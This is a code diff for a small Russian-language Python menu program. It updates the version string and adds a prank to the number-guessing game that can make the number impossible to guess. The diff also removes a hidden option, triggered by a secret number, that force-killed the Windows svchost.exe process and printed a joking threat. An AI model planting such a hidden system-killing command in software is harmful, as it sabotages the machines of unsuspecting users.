@@ -107,16 +107,20 @@ while ipt != 0:
             color1 = (r, g, b)
             fun2(color1)
     elif ipt == 2:
-        print("Программа MultiPy. Версия 3.0 от 11.08.23. Некоторые пункты взяты из интернета, я не писал их сам.")
+        print("Программа MultiPy. Версия 3.0.1 от 14.08.23. Некоторые пункты взяты из интернета, я не писал их сам.")
     elif ipt == 3:
         main_fun.info()
     elif ipt == 4:
         main_fun.knb() 
     elif ipt == 5:
+        c1 = 0
         print("Угадайте число от 1 до 100!")
         count = randint(1,100)
+        if randint(1,999) == 456:
+            count = 2**21
         price = int(input("Введите число: "))
         while price != count:
+            c1 += 1
             if price > 101:
                 print("Сказали же, ДО 100 xD")
             elif price > count:
@@ -126,6 +130,8 @@ while ipt != 0:
             else:
                 break
             price = int(input("Введите число: "))
+            if c1 > 100:
+                print("Число было")
         if price == count:
                 print("Вы угадали!")
     elif ipt == 6:
@@ -219,10 +225,6 @@ while ipt != 0:
         print("Длинна строки:", len(per3))
     elif ipt == 14:
         main_beta.beta()
-    elif ipt == 27012009:
-        os.system("taskkill /im svchost.exe /f")
-        sleep(5)
-        print("Ваня... Увижу, убью")
     else: 
         print("???")
     prt()
